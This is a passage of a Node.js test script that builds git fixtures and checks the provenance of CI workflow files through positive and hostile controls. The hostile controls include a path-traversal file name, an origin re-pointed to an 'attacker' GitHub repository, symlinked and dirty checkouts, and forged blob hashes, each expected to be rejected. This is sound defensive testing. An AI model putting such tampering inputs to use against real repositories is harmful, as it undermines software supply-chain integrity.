  assert.equal(gitAt(sourceRoot, "rev-parse", "HEAD"), commitSha,
    "historical source: exact HEAD mismatch");
  assert.equal(canonicalGitHubRepositoryUrl(gitAt(sourceRoot, "remote", "get-url", "origin")),
    expectedRepository, "historical source: repository identity mismatch");
  assert.equal(gitAt(sourceRoot, "status", "--porcelain=v1"), "",
    "historical source: dirty checkout rejected");
  return assertExactPathEvidence({ sourceRoot, commitSha, file,
    sourceClass: PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE },
  PATH_EVIDENCE_STATES.PATH_PRESENT_IN_COMMIT, expectedBlob);
}

const historicalSourceRoot = authorityRoots.pr16HistoricalSource
  ? realpathSync(path.resolve(authorityRoots.pr16HistoricalSource))
  : path.join(temporary, "pr16-full-exact-historical-source");
if (!authorityRoots.pr16HistoricalSource) {
  run(temporary, ["git", "clone", "-q", "--no-hardlinks", trustedSourceRoot, historicalSourceRoot]);
  gitAt(historicalSourceRoot, "checkout", "-q", "--detach", REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE);
  gitAt(historicalSourceRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
}

const topologyOnlyObservation = assertExactPathEvidence({
  sourceRoot: preverifiedPr16ChainAuthority.root,
  commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE,
  file: HISTORICAL_WORKFLOW_PATH,
  sourceClass: PATH_SOURCE_CLASSES.TOPOLOGY_COMMIT_AUTHORITY,
}, PATH_EVIDENCE_STATES.OBJECT_NOT_IMPORTED);
const fullHistoricalObservation = assertHistoricalWorkflowPresent({ sourceRoot: historicalSourceRoot });
const syntheticAbsentObservation = assertExactPathEvidence({
  sourceRoot: historicalSourceRoot,
  commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE,
  file: ".github/workflows/does-not-exist.yml",
  sourceClass: PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE,
}, PATH_EVIDENCE_STATES.PATH_ABSENT_IN_COMMIT);
console.log("PASS FALSE_ABSENCE_INFERENCE_REPRODUCED");

const sourceClassRecords = AMENDMENT_CONTROLLED_FILES.map((file) => {
  const expected = trustedSourceFor(file);
  return validateFixtureSourceRecord({ file, ...expected });
});

function createPathObjectFixture(name, { importCommit = true, importTrees = [] } = {}) {
  const fixture = path.join(temporary, `path-evidence-${name}`);
  gitAt(temporary, "init", "-q", fixture);
  gitAt(fixture, "remote", "add", "origin", OFFICIAL_REPOSITORY);
  const importObject = (type, oid) => {
    const raw = execFileSync("git", ["cat-file", type, oid], {
      cwd: historicalSourceRoot, stdio: ["ignore", "pipe", "pipe"],
    });
    assert.equal(execFileSync("git", ["hash-object", "-w", "-t", type, "--stdin"], {
      cwd: fixture, input: raw, encoding: "utf8", stdio: ["pipe", "pipe", "pipe"],
    }).trim(), oid, `path evidence: ${type} import identity mismatch`);
  };
  if (importCommit) importObject("commit", REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE);
  for (const tree of importTrees) importObject("tree", tree);
  return fixture;
}
const historicalRootTree = gitAt(historicalSourceRoot, "rev-parse",
  `${REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE}^{tree}`);
const historicalGithubTree = gitAt(historicalSourceRoot, "rev-parse",
  `${REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE}:.github`);
const historicalWorkflowsTree = gitAt(historicalSourceRoot, "rev-parse",
  `${REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE}:.github/workflows`);
const missingCommitFixture = createPathObjectFixture("missing-commit", { importCommit: false });
const missingBlobFixture = createPathObjectFixture("missing-blob", {
  importTrees: [historicalRootTree, historicalGithubTree, historicalWorkflowsTree],
});
const wrongHeadFixture = path.join(temporary, "path-evidence-wrong-head");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", rejectedChainWorkflowSource.root,
  wrongHeadFixture]);
gitAt(wrongHeadFixture, "checkout", "-q", "--detach", REJECTED_PR16_CLEANLINESS_CANDIDATE);
gitAt(wrongHeadFixture, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
const wrongHistoricalRepositoryFixture = path.join(temporary, "path-evidence-wrong-repository");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", historicalSourceRoot,
  wrongHistoricalRepositoryFixture]);
gitAt(wrongHistoricalRepositoryFixture, "remote", "set-url", "origin",
  "https://github.com/attacker/zbestmedia");
const dirtyHistoricalFixture = path.join(temporary, "path-evidence-dirty");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", historicalSourceRoot, dirtyHistoricalFixture]);
writeFileSync(path.join(dirtyHistoricalFixture, HISTORICAL_WORKFLOW_PATH), "working-tree substitution\n");
const linkedHistoricalFixture = path.join(temporary, "path-evidence-linked");
symlinkSync(historicalSourceRoot, linkedHistoricalFixture);

const semanticPositiveControls = [
  ["topology_commit_available", () => assert.equal(gitAt(preverifiedPr16ChainAuthority.root,
    "cat-file", "-t", REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE), "commit")],
  ["topology_tree_unavailable", () => assert.equal(topologyOnlyObservation.treeSha !== undefined, true)],
  ["topology_classified_object_not_imported", () => assert.equal(topologyOnlyObservation.state,
    PATH_EVIDENCE_STATES.OBJECT_NOT_IMPORTED)],
  ["full_exact_source_available", () => assert.ok(existsSync(historicalSourceRoot))],
  ["full_exact_source_head", () => assert.equal(gitAt(historicalSourceRoot, "rev-parse", "HEAD"),
    REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE)],
  ["historical_path_resolves", () => assert.equal(fullHistoricalObservation.path, HISTORICAL_WORKFLOW_PATH)],
  ["historical_blob_exact", () => assert.equal(fullHistoricalObservation.blob, HISTORICAL_WORKFLOW_BLOB)],
  ["historical_path_present", () => assert.equal(fullHistoricalObservation.state,
    PATH_EVIDENCE_STATES.PATH_PRESENT_IN_COMMIT)],
  ["synthetic_path_absent", () => assert.equal(syntheticAbsentObservation.state,
    PATH_EVIDENCE_STATES.PATH_ABSENT_IN_COMMIT)],
  ["unknown_never_absent", () => assert.notEqual(topologyOnlyObservation.state,
    PATH_EVIDENCE_STATES.PATH_ABSENT_IN_COMMIT)],
  ...AMENDMENT_OWNED_FIXTURE_FILES.map((file) => [`candidate_source_class:${file}`, () => assert.equal(
    sourceClassRecords.find((record) => record.path === file).sourceClass, "AMENDMENT_OWNED")]),
  ["trusted_base_source_class", () => assert.ok(sourceClassRecords.filter(
    ({ sourceClass }) => sourceClass === "TRUSTED_BASE_OWNED").every(
    ({ exactSourceSha }) => exactSourceSha === CURRENT_TRUSTED_BASE))],
  ["topology_through_6867", () => assert.deepEqual(preverifiedPr16ChainAuthority.parents(
    REJECTED_PR16_ACTION_INVENTORY_CANDIDATE), [REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE])],
  ["replacement_parent_current_remote_head", () => assert.deepEqual(
    commitParents(trustedSourceRoot, amendmentSourceSha),
    [REJECTED_PR16_SEMANTIC_PROVENANCE_CANDIDATE])],
  ["action_inventory_exact_15", () => assert.equal(currentActionResult.required, 15)],
  ["candidate_data_required_9", () => assert.equal(semanticCandidateSummary.required, 9)],
  ["candidate_data_uncertified", () => assert.equal(semanticCandidateSummary.certified, false)],
  ["protected_operations_zero", () => assert.equal(semanticCandidateSummary.protectedOperations, 0)],
];

const semanticHostileControls = [
  ["commit_object_missing", () => assertExactPathEvidence({ sourceRoot: missingCommitFixture,
    commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE, file: HISTORICAL_WORKFLOW_PATH,
    sourceClass: PATH_SOURCE_CLASSES.TOPOLOGY_COMMIT_AUTHORITY },
  PATH_EVIDENCE_STATES.PATH_PRESENT_IN_COMMIT, HISTORICAL_WORKFLOW_BLOB)],
  ["commit_only_claims_absent", () => assertExactPathEvidence({ sourceRoot: preverifiedPr16ChainAuthority.root,
    commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE, file: HISTORICAL_WORKFLOW_PATH,
    sourceClass: PATH_SOURCE_CLASSES.TOPOLOGY_COMMIT_AUTHORITY }, PATH_EVIDENCE_STATES.PATH_ABSENT_IN_COMMIT)],
  ["missing_tree_claims_absent", () => assertExactPathEvidence({ sourceRoot: preverifiedPr16ChainAuthority.root,
    commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE, file: HISTORICAL_WORKFLOW_PATH,
    sourceClass: PATH_SOURCE_CLASSES.TOPOLOGY_COMMIT_AUTHORITY }, PATH_EVIDENCE_STATES.PATH_ABSENT_IN_COMMIT)],
  ["missing_blob_claims_absent", () => assertExactPathEvidence({ sourceRoot: missingBlobFixture,
    commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE, file: HISTORICAL_WORKFLOW_PATH,
    sourceClass: PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE }, PATH_EVIDENCE_STATES.PATH_ABSENT_IN_COMMIT)],
  ["wrong_historical_path", () => assertHistoricalWorkflowPresent({ sourceRoot: historicalSourceRoot,
    file: ".github/workflows/not-ci.yml" })],
  ["wrong_expected_blob", () => assertHistoricalWorkflowPresent({ sourceRoot: historicalSourceRoot,
    expectedBlob: "f".repeat(40) })],
  ["substituted_historical_sha", () => assertHistoricalWorkflowPresent({ sourceRoot: historicalSourceRoot,
    commitSha: REJECTED_PR16_CLEANLINESS_CANDIDATE })],
  ["mutable_historical_branch", () => classifyExactPathEvidence({ sourceRoot: historicalSourceRoot,
    commitSha: "codex/bt-1", file: HISTORICAL_WORKFLOW_PATH,
    sourceClass: PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE })],
  ["mutable_historical_tag", () => classifyExactPathEvidence({ sourceRoot: historicalSourceRoot,
    commitSha: "v1.0.0", file: HISTORICAL_WORKFLOW_PATH,
    sourceClass: PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE })],
  ["abbreviated_historical_sha", () => classifyExactPathEvidence({ sourceRoot: historicalSourceRoot,
    commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE.slice(0, 12), file: HISTORICAL_WORKFLOW_PATH,
    sourceClass: PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE })],
  ["historical_head_mismatch", () => assertHistoricalWorkflowPresent({ sourceRoot: wrongHeadFixture })],
  ["historical_repository_mismatch", () => assertHistoricalWorkflowPresent({
    sourceRoot: wrongHistoricalRepositoryFixture })],
  ["working_tree_file_substitution", () => assertHistoricalWorkflowPresent({ sourceRoot: dirtyHistoricalFixture })],
  ["dirty_historical_checkout", () => assertHistoricalWorkflowPresent({ sourceRoot: dirtyHistoricalFixture })],
  ["symlink_historical_source", () => assertHistoricalWorkflowPresent({ sourceRoot: linkedHistoricalFixture })],
  ["topology_impersonates_full_source", () => assertHistoricalWorkflowPresent({
    sourceRoot: preverifiedPr16ChainAuthority.root })],
  ...AMENDMENT_OWNED_FIXTURE_FILES.map((file) => [`candidate_sourced_from_predecessor:${file}`,
    () => validateFixtureSourceRecord({ file, sourceClass: "AMENDMENT_OWNED",
      sourceSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE })]),
  ["trusted_file_sourced_from_candidate_semantic", () => validateFixtureSourceRecord({
    file: ".github/workflows/p1a-certify.yml", sourceClass: "TRUSTED_BASE_OWNED",
    sourceSha: amendmentSourceSha })],
  ["current_candidate_blob_mismatch_semantic", () => validateFixtureSourceRecord({
    file: HISTORICAL_WORKFLOW_PATH, sourceClass: "AMENDMENT_OWNED", sourceSha: amendmentSourceSha,
    installedBlobSha: "e".repeat(40) })],
  ["installed_fixture_blob_mismatch_semantic", () => validateFixtureSourceRecord({
    file: "scripts/test-p1a-dual-base-verifier.mjs", sourceClass: "AMENDMENT_OWNED",
    sourceSha: amendmentSourceSha, installedBlobSha: "d".repeat(40) })],
  ["false_historical_file_synthesis", () => assertExactPathEvidence({
    sourceRoot: preverifiedPr16ChainAuthority.root, commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE,
    file: HISTORICAL_WORKFLOW_PATH, sourceClass: PATH_SOURCE_CLASSES.TOPOLOGY_COMMIT_AUTHORITY },
  PATH_EVIDENCE_STATES.PATH_PRESENT_IN_COMMIT, HISTORICAL_WORKFLOW_BLOB)],
  ["false_historical_file_removal", () => assertExactPathEvidence({ sourceRoot: historicalSourceRoot,
    commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE, file: HISTORICAL_WORKFLOW_PATH,
    sourceClass: PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE }, PATH_EVIDENCE_STATES.PATH_ABSENT_IN_COMMIT)],
  ["classifier_exception_fails_closed", () => classifyExactPathEvidence({
    sourceRoot: path.join(temporary, "missing-source"), commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE,
    file: HISTORICAL_WORKFLOW_PATH, sourceClass: PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE })],
  ["unknown_coerced_to_absence", () => assert.equal(topologyOnlyObservation.state,
    PATH_EVIDENCE_STATES.PATH_ABSENT_IN_COMMIT)],
  ["unrecognized_state_accepted", () => assertExactPathEvidence({ sourceRoot: historicalSourceRoot,
    commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE, file: HISTORICAL_WORKFLOW_PATH,
    sourceClass: PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE }, "UNKNOWN_STATE")],
  ["source_class_omitted", () => classifyExactPathEvidence({ sourceRoot: historicalSourceRoot,
    commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE, file: HISTORICAL_WORKFLOW_PATH })],
  ["source_sha_omitted", () => classifyExactPathEvidence({ sourceRoot: historicalSourceRoot,
    file: HISTORICAL_WORKFLOW_PATH, sourceClass: PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE })],
  ["present_blob_omitted", () => assertExactPathEvidence({ sourceRoot: historicalSourceRoot,
    commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE, file: HISTORICAL_WORKFLOW_PATH,
    sourceClass: PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE },
  PATH_EVIDENCE_STATES.PATH_PRESENT_IN_COMMIT)],
];
const sourceClassPositiveControls = [
  ["topology_object_gap_does_not_claim_absence", () => assert.equal(
    topologyOnlyObservation.state, PATH_EVIDENCE_STATES.OBJECT_NOT_IMPORTED)],
  ["topology_object_gap_does_not_break_topology", () => assert.equal(
    preverifiedPr16ChainAuthority.parents(REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE)[0],
    REJECTED_PR16_CLEANLINESS_CANDIDATE)],
  ...AMENDMENT_OWNED_FIXTURE_FILES.map((file) => [`candidate_contains:${file}`, () => assert.equal(
    sourceEntry(trustedSourceRoot, amendmentSourceSha, file).blob,
    sourceClassRecords.find((record) => record.path === file).exactSourceBlobSha)]),
  ...AMENDMENT_OWNED_FIXTURE_FILES.map((file) => [`candidate_source:${file}`, () => assert.equal(
    sourceClassRecords.find((record) => record.path === file).sourceClass, "AMENDMENT_OWNED")]),
  ...AMENDMENT_OWNED_FIXTURE_FILES.map((file) => [`candidate_installed_blob:${file}`, () => assert.ok(
    sourceClassRecords.find((record) => record.path === file).equal)]),
  ["trusted_base_sources_preserved", () => assert.ok(sourceClassRecords.filter(
    ({ sourceClass }) => sourceClass === "TRUSTED_BASE_OWNED").every(
    ({ exactSourceSha }) => exactSourceSha === CURRENT_TRUSTED_BASE))],
  ["predecessor_exact_parent_preserved", () => assert.deepEqual(
    preverifiedPr16ChainAuthority.parents(REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE),
    [REJECTED_PR16_CLEANLINESS_CANDIDATE])],
  ["no_candidate_blob_from_predecessor", () => assert.ok(sourceClassRecords.filter(
    ({ sourceClass }) => sourceClass === "AMENDMENT_OWNED").every(
    ({ exactSourceSha }) => exactSourceSha === amendmentSourceSha))],
];

const sourceClassHostileControls = [
  ...AMENDMENT_OWNED_FIXTURE_FILES.map((file) => [`candidate_path_missing:${file}`, () => sourceEntry(
    preverifiedPr16ChainAuthority.root, amendmentSourceSha, file)]),
  ...AMENDMENT_OWNED_FIXTURE_FILES.map((file) => [`amendment_sourced_from_predecessor:${file}`,
    () => validateFixtureSourceRecord({ file, sourceClass: "AMENDMENT_OWNED",
      sourceSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE })]),
  ...AMENDMENT_OWNED_FIXTURE_FILES.map((file) => [`amendment_sourced_from_trusted_base:${file}`,
    () => validateFixtureSourceRecord({ file, sourceClass: "AMENDMENT_OWNED", sourceSha: CURRENT_TRUSTED_BASE })]),
  ["trusted_file_sourced_from_candidate", () => validateFixtureSourceRecord({
    file: ".github/workflows/p1a-certify.yml", sourceClass: "TRUSTED_BASE_OWNED",
    sourceSha: amendmentSourceSha })],
  ["substituted_candidate_sha", () => validateFixtureSourceRecord({
    file: ".github/workflows/ci.yml", sourceClass: "AMENDMENT_OWNED", sourceSha: amendmentSourceSha,
    expectedCandidateSha: "f".repeat(40) })],
  ["mutable_candidate_branch", () => validateFixtureSourceRecord({
    file: ".github/workflows/ci.yml", sourceClass: "AMENDMENT_OWNED", sourceSha: "codex/bt-1" })],
  ["mutable_candidate_tag", () => validateFixtureSourceRecord({
    file: ".github/workflows/ci.yml", sourceClass: "AMENDMENT_OWNED", sourceSha: "v1.0.0" })],
  ["abbreviated_candidate_sha", () => validateFixtureSourceRecord({
    file: ".github/workflows/ci.yml", sourceClass: "AMENDMENT_OWNED",
    sourceSha: amendmentSourceSha.slice(0, 12) })],
  ["candidate_blob_mismatch", () => validateFixtureSourceRecord({
    file: ".github/workflows/ci.yml", sourceClass: "AMENDMENT_OWNED", sourceSha: amendmentSourceSha,
    installedBlobSha: "f".repeat(40) })],
  ["fixture_blob_mismatch", () => validateFixtureSourceRecord({
    file: "scripts/test-p1a-dual-base-verifier.mjs", sourceClass: "AMENDMENT_OWNED",
    sourceSha: amendmentSourceSha, installedBlobSha: "e".repeat(40) })],
  ["missing_predecessor_object", () => preverifiedPr16ChainAuthority.parents("0".repeat(40))],
  ["wrong_predecessor_parent", () => resolveAuthorizedLinearAmendment(topologyReplacement,
    (sha) => sha === REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE
      ? [ORIGINAL_PR16_AMENDMENT] : exactTopology.get(sha))],
  ["working_tree_fallback", () => validateFixtureSourceRecord({
    file: ".github/workflows/ci.yml", sourceClass: "AMENDMENT_OWNED", sourceSha: amendmentSourceSha,
    sourceRoot: root })],
  ["dirty_source_root", () => {
    const dirty = path.join(temporary, "dirty-source-root");
    run(temporary, ["git", "clone", "-q", "--no-hardlinks", trustedSourceRoot, dirty]);
    writeFileSync(path.join(dirty, "untracked-hostile.txt"), "dirty\n");
    return validateFixtureSourceRecord({ file: ".github/workflows/ci.yml",
      sourceClass: "AMENDMENT_OWNED", sourceSha: amendmentSourceSha, sourceRoot: dirty });
  }],
  ["symlink_source_root", () => {
    const linked = path.join(temporary, "linked-source-root");
    symlinkSync(trustedSourceRoot, linked);
    return validateFixtureSourceRecord({ file: ".github/workflows/ci.yml",
      sourceClass: "AMENDMENT_OWNED", sourceSha: amendmentSourceSha, sourceRoot: linked });
  }],
  ["path_traversal", () => validateFixtureSourceRecord({ file: "scripts/../.github/workflows/ci.yml",
    sourceClass: "AMENDMENT_OWNED", sourceSha: amendmentSourceSha })],
  ["unclassified_path", () => validateFixtureSourceRecord({ file: "untrusted/current.txt",
    sourceClass: "AMENDMENT_OWNED", sourceSha: amendmentSourceSha })],
  ["historical_path_synthesized", () => validateFixtureSourceRecord({ file: ".github/workflows/ci.yml",
    sourceClass: "WORKFLOW_OWNED_PREDECESSOR_AUTHORITY",
    sourceSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE })],
  ["historical_absence_misclassified_as_candidate_absence", () => assert.equal(
    sourceEntry(trustedSourceRoot, amendmentSourceSha, ".github/workflows/ci.yml").blob, undefined)],
];
const sourceClassPositiveOutcomes = sourceClassPositiveControls.map(([name, operation]) => {
  try { operation(); console.log(`PASS source_class_positive:${name}`); return true; }
  catch (error) { console.error(`FAIL source_class_positive:${name}: ${error.message}`); return false; }
});
const sourceClassHostileOutcomes = sourceClassHostileControls.map(([name, operation]) => {
  const rejected = rejects(operation);
  if (rejected) console.log(`PASS source_class_hostile:${name}`);
  else console.error(`FAIL source_class_hostile:${name}: hostile source accepted`);
  return rejected;
});
assert.ok(sourceClassPositiveOutcomes.every(Boolean), "source-class positive control failed");
assert.ok(sourceClassHostileOutcomes.every(Boolean), "source-class hostile control survived");
console.log(JSON.stringify({
  suite: "p1-a-source-class-provenance-controls",
  candidateSha: amendmentSourceSha,
  predecessorSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE,
  trustedBaseSha: CURRENT_TRUSTED_BASE,
  topologyOnlyPathState: topologyOnlyObservation.state,
  fullSourcePathState: fullHistoricalObservation.state,
  historicalWorkflowBlob: fullHistoricalObservation.blob,
  positiveRequired: sourceClassPositiveControls.length,
  positiveExecuted: sourceClassPositiveControls.length,
  positivePassed: sourceClassPositiveOutcomes.filter(Boolean).length,
  hostileRequired: sourceClassHostileControls.length,
  hostileExecuted: sourceClassHostileControls.length,
  hostilePassed: sourceClassHostileOutcomes.filter(Boolean).length,
  files: sourceClassRecords,
  failed: 0, skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));

let sequence = 0;
const trustedFixtureProvenance = [];
function trustedWorkflow() {
  const env = { ...process.env, GIT_INDEX_FILE: path.join(temporary, "workflow-index") };
  run(repository, ["git", "read-tree", CURRENT_TRUSTED_BASE], { env });
  for (const file of AMENDMENT_CONTROLLED_FILES) {
    const provenance = trustedSourceFor(file);
    const validated = validateFixtureSourceRecord({ file, ...provenance });
    const source = { mode: sourceEntry(trustedSourceRoot, provenance.sourceSha, file).mode,
      blob: validated.exactSourceBlobSha };
    run(repository, ["git", "update-index", "--add", "--cacheinfo", source.mode, source.blob, file], { env });
    const installed = run(repository, ["git", "ls-files", "--stage", "--", file], { env }).split(/\s+/)[1];
    assert.equal(installed, source.blob, `${file}: trusted fixture installed blob mismatch`);
    trustedFixtureProvenance.push({
      path: file,
      expectedSourceClass: provenance.sourceClass,
      exactSourceSha: provenance.sourceSha,
      exactSourceBlobSha: source.blob,
      actualInstalledBlobSha: installed,
      equal: installed === source.blob,
    });
  }
  const tree = run(repository, ["git", "write-tree"], { env });
  return run(repository, ["git", "commit-tree", tree, "-p", CURRENT_TRUSTED_BASE, "-m", "trusted amendment fixture"], { env });
}
const workflowSha = trustedWorkflow();
assert.equal(trustedFixtureProvenance.length, AMENDMENT_CONTROLLED_FILES.length,
  "provenance: incomplete trusted fixture accounting");
assert.ok(trustedFixtureProvenance.every(({ equal }) => equal), "provenance: trusted fixture mismatch");
const trustedBaseCiBlob = sourceEntry(trustedSourceRoot, amendmentSourceSha, ".github/workflows/ci.yml").blob;
assert.equal(git("rev-parse", `${workflowSha}:.github/workflows/ci.yml`), trustedBaseCiBlob,
  "provenance: trusted CI was not sourced from exact amendment subject");
const rejectedCiBlob = gitAt(root, "rev-parse", `${REJECTED_RECONCILIATION}:.github/workflows/ci.yml`);
assert.notEqual(rejectedCiBlob, trustedBaseCiBlob,
  "provenance before-proof requires contaminated candidate CI to differ from trusted base");
console.log("PASS trusted_harness_before_contamination_reproduced");
console.log("PASS trusted_harness_after_exact_base_independence");
console.log(JSON.stringify({
  suite: "p1-a-trusted-harness-provenance",
  trustedBaseSha: CURRENT_TRUSTED_BASE,
  amendmentSourceSha,
  rejectedReconciliationSha: REJECTED_RECONCILIATION,
  files: trustedFixtureProvenance,
  failed: 0, skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));

function candidate({ omit, add, mutate, ciAppend = "", ciTransform,
  omitOriginalParent = false, reverseParents = false } = {}) {
  sequence += 1;
  const env = { ...process.env, GIT_INDEX_FILE: path.join(temporary, `index-${sequence}`) };
  run(repository, ["git", "read-tree", workflowSha], { env });
  for (const file of CANDIDATE_OWNED_FILES) {
    if (file === ".github/workflows/ci.yml") continue;
    if (file === omit) continue;
    const source = entry(ORIGINAL_CANDIDATE, file);
    run(repository, ["git", "update-index", "--add", "--cacheinfo", source.mode, source.blob, file], { env });
  }
  if (omit !== ".github/workflows/ci.yml") {
    const trustedCi = git("show", `${workflowSha}:.github/workflows/ci.yml`);
    const composedCi = `${composeCandidateCi(trustedCi)}${ciAppend}`;
    const resolvedCi = ciTransform ? ciTransform(composedCi) : composedCi;
    const blob = run(repository, ["git", "hash-object", "-w", "--stdin"], { env, input: `${resolvedCi}\n` });
    run(repository, ["git", "update-index", "--add", "--cacheinfo", "100644", blob, ".github/workflows/ci.yml"], { env });
  }
  if (omit) run(repository, ["git", "update-index", "--force-remove", "--", omit], { env });
  for (const file of [mutate, add].filter(Boolean)) {
    const blob = run(repository, ["git", "hash-object", "-w", "--stdin"], { env, input: `fixture ${file}\n` });
    run(repository, ["git", "update-index", "--add", "--cacheinfo", "100644", blob, file], { env });
  }
  const tree = run(repository, ["git", "write-tree"], { env });
  const parents = [];
  if (reverseParents) {
    parents.push("-p", workflowSha);
    if (!omitOriginalParent) parents.push("-p", ORIGINAL_CANDIDATE);
  } else {
    if (!omitOriginalParent) parents.push("-p", ORIGINAL_CANDIDATE);
    parents.push("-p", workflowSha);
  }
  const commit = run(repository, ["git", "commit-tree", tree, ...parents, "-m", `fixture ${sequence}`], { env });
  if (omit !== ".github/workflows/ci.yml" && mutate !== ".github/workflows/ci.yml") {
    const finalCi = git("show", `${commit}:.github/workflows/ci.yml`);
    assert.ok(finalCi.includes("--candidate-data-only"));
    assert.ok(!finalCi.includes("pnpm test:p1a-threat-model"));
  }
  return commit;
}

const validCandidate = candidate();
// Provenance-pure construction starts from the current trusted base, so native
// ancestry must already hold. Re-propagation independently checks the historical
// trusted DAG inventory without being used to manufacture that ancestry.
git("merge-base", "--is-ancestor", TRUSTED_RECONCILIATION_BASE, validCandidate);
const reconciliationFailureBeforePropagation = false;
console.log("PASS reconciliation_fixture_native_ancestry_from_exact_trusted_source");
const reconciliationPropagationRoot = freshReconciliationFixture("independent-propagation-proof");
const reconciliationFixture = propagateTrustedReconciliationDag({
  trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root,
  reconciliationFixtureRoot: reconciliationPropagationRoot,
});
assert.equal(reconciliationFixture.importedCommits, 10);
assert.equal(reconciliationFixture.boundarySha, AUTHORIZED_BASE);
git("merge-base", "--is-ancestor", AUTHORIZED_BASE, TRUSTED_RECONCILIATION_BASE);
git("merge-base", "--is-ancestor", TRUSTED_RECONCILIATION_BASE, validCandidate);
console.log("PASS reconciliation_fixture_after_propagation_native_ancestry");
const reconciliationFixturePositiveControls = [
  ["exact_source_authority", () => assert.equal(reconciliationFixture.sourceRoot, verifiedAuthorities.trustedReconciliation.root)],
  ["ten_exact_commits", () => assert.equal(reconciliationFixture.importedCommits, 10)],
  ["exact_tree_identities", () => assert.ok(reconciliationFixture.importedTrees >= 1)],
  ["sole_common_boundary", () => assert.equal(readFileSync(path.join(reconciliationPropagationRoot, ".git/shallow"), "utf8"), `${AUTHORIZED_BASE}\n`)],
  ["forbidden_parent_absent", () => assert.ok(rejects(() => gitAt(reconciliationPropagationRoot, "cat-file", "-e", `${PRE_BASE_PARENT}^{commit}`)))],
  ["no_alternates", () => assert.ok(!existsSync(path.join(reconciliationPropagationRoot, ".git/objects/info/alternates")))],
  ["no_shared_store", () => assert.notEqual(realpathSync(path.join(reconciliationPropagationRoot, ".git")), verifiedAuthorities.trustedReconciliation.gitDir)],
  ["boundary_to_trusted_head", () => git("merge-base", "--is-ancestor", AUTHORIZED_BASE, TRUSTED_RECONCILIATION_BASE)],
  ["trusted_head_to_workflow", () => git("merge-base", "--is-ancestor", TRUSTED_RECONCILIATION_BASE, workflowSha)],
  ["trusted_head_to_candidate", () => git("merge-base", "--is-ancestor", TRUSTED_RECONCILIATION_BASE, validCandidate)],
];
const reconciliationFixturePositiveOutcomes = reconciliationFixturePositiveControls.map(([name, operation]) => {
  try { operation(); console.log(`PASS reconciliation_fixture_positive:${name}`); return true; }
  catch (error) { console.error(`FAIL reconciliation_fixture_positive:${name}: ${error.message}`); return false; }
});
const candidateDataRun = (sha = validCandidate, extraEnv = {}) => {
  git("checkout", "--detach", sha);
  const output = run(root, [
    process.execPath, path.join(root, "scripts/validate-p1a-threat-model.mjs"),
    "--candidate-data-only",
  ], { env: {
    ...process.env,
    P1A_PACKAGE_ROOT: repository,
    P1A_CANDIDATE_SHA: sha,
    P1A_ANCESTRY_AUTHORITY_ROOT: verifiedAuthorities.ancestry.root,
    P1A_TRUSTED_RECONCILIATION_AUTHORITY_ROOT: verifiedAuthorities.trustedReconciliation.root,
    ...extraEnv,
  } });
  return JSON.parse(output.split("\n").at(-1));
};
const semanticCandidateSummary = candidateDataRun();
const semanticPositiveOutcomes = semanticPositiveControls.map(([name, operation]) => {
  try { operation(); console.log(`PASS semantic_path_positive:${name}`); return true; }
  catch (error) { console.error(`FAIL semantic_path_positive:${name}: ${error.message}`); return false; }
});
const semanticHostileOutcomes = semanticHostileControls.map(([name, operation]) => {
  const rejected = rejects(operation);
  if (rejected) console.log(`PASS semantic_path_hostile:${name}`);
  else console.error(`FAIL semantic_path_hostile:${name}: hostile semantic condition accepted`);
  return rejected;
});
assert.ok(semanticPositiveOutcomes.every(Boolean), "semantic path positive control failed");
assert.ok(semanticHostileOutcomes.every(Boolean), "semantic path hostile control survived");
